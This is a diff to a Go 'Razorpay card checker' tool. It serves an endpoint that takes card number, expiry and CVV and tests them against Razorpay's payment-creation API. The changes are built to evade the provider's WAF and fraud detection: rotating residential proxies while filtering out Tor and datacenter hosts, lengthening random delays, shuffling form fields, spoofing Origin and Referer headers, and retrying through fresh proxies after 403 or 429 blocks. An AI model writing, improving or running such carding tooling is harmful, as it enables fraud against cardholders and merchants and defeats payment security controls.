@@ -17,6 +17,7 @@ import (
 	"net/url"
 	"os"
 	"regexp"
+	"sort"
 	"strconv"
 	"strings"
 	"sync"
@@ -26,7 +27,7 @@ import (
 
 // ────────────────────────────────────────────────────────────────────────
 //  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-//  Modified for Railway.app + sites.txt support + WAF Bypass v3 (FIXED)
+//  Modified for Railway.app + sites.txt support + WAF Bypass v4 (DEEP FIXED)
 // ────────────────────────────────────────────────────────────────────────
 
 const (
@@ -110,43 +111,79 @@ func loadProxies(filepath string) []parsedProxy {
 	return proxies
 }
 
-// FIX 1: Enhanced bad host detection - added datacenter/cloud prefixes
+// FIX 1: IMPROVED PROXY HOST EXTRACTION - Remove port BEFORE checking
+func extractProxyHost(raw string) string {
+	host := raw
+	
+	// Remove scheme first
+	if idx := strings.Index(host, "://"); idx != -1 {
+		host = host[idx+3:]
+	}
+	
+	// Remove port (CRITICAL FIX)
+	if idx := strings.Index(host, ":"); idx != -1 {
+		host = host[:idx]
+	}
+	
+	// Remove credentials
+	if idx := strings.Index(host, "@"); idx != -1 {
+		host = host[idx+1:]
+	}
+	
+	return strings.ToLower(strings.TrimSpace(host))
+}
+
+// FIX 2: Enhanced bad host detection - Better patterns and Contains instead of HasPrefix
 var torOrBadHosts = []string{
-	"tor.", "pl-tor.", "exit.", "relay.",
-	"datacenter", "aws.", "azure.", "gcp.", "linode.", "digitalocean.",
-	"vultr.", "hetzner.", "ovh.", "contabo.", "vps", "vpn.", "proxy.",
+	"tor", "pl-tor", "exit", "relay",
+	"datacenter", "aws", "azure", "gcp",
+	"linode", "digitalocean", "vultr",
+	"hetzner", "ovh", "contabo", "vps",
+	"proxy", "vpn", "res-", "res.",
+	"socks", "tunnel", "anonym",
 }
 
 func isBadProxyHost(raw string) bool {
-	host := raw
-	if idx := strings.Index(raw, "@"); idx != -1 {
-		host = raw[idx+1:]
+	host := extractProxyHost(raw)
+	
+	if host == "" {
+		return true
 	}
-	if idx := strings.Index(raw, "://"); idx != -1 {
-		host = raw[idx+3:]
-	}
-	hostLower := strings.ToLower(host)
+	
+	// Use Contains instead of HasPrefix for better matching
 	for _, bad := range torOrBadHosts {
-		if strings.HasPrefix(hostLower, bad) {
+		if strings.Contains(host, bad) {
+			log.Printf("DEBUG: Blocked proxy - pattern '%s' found in '%s'", bad, host)
 			return true
 		}
 	}
 	return false
 }
 
+// FIX 3: CRITICAL - getNextProxy with proper fallback
 func getNextProxy(proxyList []parsedProxy) *parsedProxy {
 	if len(proxyList) == 0 {
 		return nil
 	}
-	// Try up to 15 proxies skipping known bad hosts (increased from 8)
-	for attempt := 0; attempt < 15; attempt++ {
+	
+	// Try up to 100 times to find a good proxy
+	maxAttempts := 100
+	if maxAttempts > len(proxyList)*5 {
+		maxAttempts = len(proxyList) * 5
+	}
+	
+	for attempt := 0; attempt < maxAttempts; attempt++ {
 		idx := atomic.AddUint64(&proxyIndex, 1) - 1
 		p := proxyList[idx%uint64(len(proxyList))]
+		
 		if !isBadProxyHost(p.raw) {
+			log.Printf("✓ Selected good proxy after %d attempts: %s", attempt, extractProxyHost(p.raw))
 			return &p
 		}
 	}
-	// Fall back to any proxy
+	
+	// If still not found, log and return any proxy
+	log.Printf("⚠ WARNING: Could not find good proxy after %d attempts, using random", maxAttempts)
 	idx := atomic.AddUint64(&proxyIndex, 1) - 1
 	p := proxyList[idx%uint64(len(proxyList))]
 	return &p
@@ -313,6 +350,29 @@ func generateRzpSessionID() string {
 	return string(buf)
 }
 
+// FIX 4: Shuffle form values for realistic submission
+func shuffleFormValues(v url.Values) url.Values {
+	type kv struct {
+		key   string
+		value []string
+	}
+	var items []kv
+	for k := range v {
+		items = append(items, kv{k, v[k]})
+	}
+	
+	// Fisher-Yates shuffle
+	for i := len(items) - 1; i > 0; i-- {
+		j := randInt(0, i)
+		items[i], items[j] = items[j], items[i]
+	}
+	
+	result := url.Values{}
+	for _, item := range items {
+		result[item.key] = item.value
+	}
+	return result
+}
 
 // resolveRazorpayInitData handles both page types:
 //   1. pages.razorpay.com  — classic static page with "var data = {...}"
@@ -417,23 +477,9 @@ func resolveRazorpayInitData(fetch *CustomFetch, targetURL string, proxyRaw stri
 	return nil, "", fmt.Errorf("Failed to locate Razorpay data on page")
 }
 
-// FIX 2: Enhanced HTML extraction with more patterns
+// tryExtractFromHTML tries multiple patterns to find init data in HTML
 func tryExtractFromHTML(html string) map[string]interface{} {
-	// Added more patterns to catch different page structures
-	patterns := []string{
-		"data", 
-		"__INITIAL_DATA__", 
-		"__rzp_config__", 
-		"rzpConfig", 
-		"pageConfig", 
-		"checkoutData",
-		"initialData",
-		"__INITIAL_STATE__",
-		"window.__data__",
-		"rzpData",
-		"checkoutPageConfig",
-	}
-	
+	patterns := []string{"data", "__INITIAL_DATA__", "__rzp_config__", "rzpConfig", "pageConfig", "checkoutData", "initialData", "__INITIAL_STATE__", "window.__data__", "rzpData", "checkoutPageConfig"}
 	for _, varName := range patterns {
 		jsonStr := extractJSONVar(html, varName)
 		if jsonStr == "" {
@@ -1029,9 +1075,8 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string) CheckR
 		)
 	}
 
-	// FIX 3: MAJOR - Increased delay before payment creation from 1.5s to 5-10s
-	// This helps bypass WAF rate limit detection
-	time.Sleep(time.Duration(randInt(5000, 10000)) * time.Millisecond)
+	// FIX 5: INCREASED delay - 8-15 seconds
+	time.Sleep(time.Duration(randInt(8000, 15000)) * time.Millisecond)
 
 	tokenCreate := base64.StdEncoding.EncodeToString([]byte(`[{"name":"sardine","metadata":{"session_id":"` + checkoutID + `"}}]`))
 
@@ -1076,44 +1121,61 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string) CheckR
 		"dcc_currency":              {orderCurrency},
 	}
 
-	// FIX 4: Enhanced headers for payment creation with cache control
-	paymentHeaders := stdHeaders()
-	paymentHeaders["Content-Type"] = "application/x-www-form-urlencoded"
-	paymentHeaders["X-Requested-With"] = "XMLHttpRequest"
-	paymentHeaders["Sec-Fetch-Site"] = "same-origin"
-	paymentHeaders["Cache-Control"] = "max-age=0"  // Additional
-	paymentHeaders["Pragma"] = "no-cache"           // Additional
+	// FIX 6: REALISTIC PAYMENT HEADERS - Use payment page origin, not API
+	paymentHeaders := map[string]string{
+		"Content-Type": "application/x-www-form-urlencoded",
+		"Origin": "https://pages.razorpay.com",  // FIX: Payment page origin
+		"Referer": targetURL,  // FIX: Actual payment page URL
+		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+		"Accept-Language": generateAcceptLanguage(),
+		"Accept-Encoding": "gzip, deflate, br",
+		"Cache-Control": "max-age=0",
+		"Pragma": "no-cache",
+		"DNT": "1",
+		"Connection": "keep-alive",
+		"X-Requested-With": "XMLHttpRequest",
+		"Sec-Fetch-Site": "same-site",
+		"Sec-Fetch-Mode": "cors",
+		"Sec-Fetch-Dest": "empty",
+	}
+
+	// FIX 7: Shuffle form fields for realism
+	shuffledForm := shuffleFormValues(form7)
 
 	r7, err := fetch.PostForm(
 		fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?x_entity_id=%s&session_token=%s&keyless_header=%s", orderID, sessid, keylessHeaderURL),
 		paymentHeaders,
-		form7,
+		shuffledForm,
 	)
 	if err != nil {
 		return makeProxyError(err, proxyRaw)
 	}
 
-	// FIX 5: Handle WAF block with enhanced retry logic
+	// FIX 8: Retry logic with proper proxy switching
 	if r7.StatusCode == 403 || r7.StatusCode == 429 {
 		bodyPreview := r7.Text()
 		if len(bodyPreview) > 150 {
 			bodyPreview = bodyPreview[:150] + "..."
 		}
-		// Retry with next proxy if available (improved from single retry)
-		for retryAttempt := 0; retryAttempt < 2; retryAttempt++ {
+		log.Printf("⚠ Payment creation blocked with %s, attempting proxy switch", extractProxyHost(proxyRaw))
+		
+		// Retry up to 3 times with different proxies
+		for retryAttempt := 0; retryAttempt < 3; retryAttempt++ {
 			pp2 := getNextProxy(globalProxyList)
 			if pp2 != nil && pp2.raw != proxyRaw {
 				fetch2, ferr := NewCustomFetch(pp2.parsed, ua)
 				if ferr == nil {
 					defer fetch2.client.CloseIdleConnections()
-					// Increased jitter before retry
-					time.Sleep(time.Duration(randInt(2000, 4000)) * time.Millisecond)
+					// Increased retry delay - 3-6 seconds
+					time.Sleep(time.Duration(randInt(3000, 6000)) * time.Millisecond)
+					
 					r7b, rerr := fetch2.PostForm(
 						fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?x_entity_id=%s&session_token=%s&keyless_header=%s", orderID, sessid, keylessHeaderURL),
 						paymentHeaders,
-						form7,
+						shuffledForm,
 					)
 					if rerr == nil && r7b.StatusCode != 403 && r7b.StatusCode != 429 {
+						log.Printf("✓ Success with retry proxy: %s", extractProxyHost(pp2.raw))
 						r7 = r7b
 						proxyRaw = pp2.raw
 						goto paymentParseContinue
@@ -1528,7 +1590,7 @@ func main() {
 	addr := fmt.Sprintf("0.0.0.0:%s", portStr)
 
 	log.Printf("=========================================================")
-	log.Printf("  RAZORPAY CARD CHECKER - GO VERSION (WAF Bypass v3 FIXED)")
+	log.Printf("  RAZORPAY CARD CHECKER - GO VERSION (WAF Bypass v4 DEEP)")
 	log.Printf("  Listening on: http://%s", addr)
 	log.Printf("  Endpoint: /razorpay/cc={cc|mm|yy|cvv}")
 	log.Printf("  Health: /health")
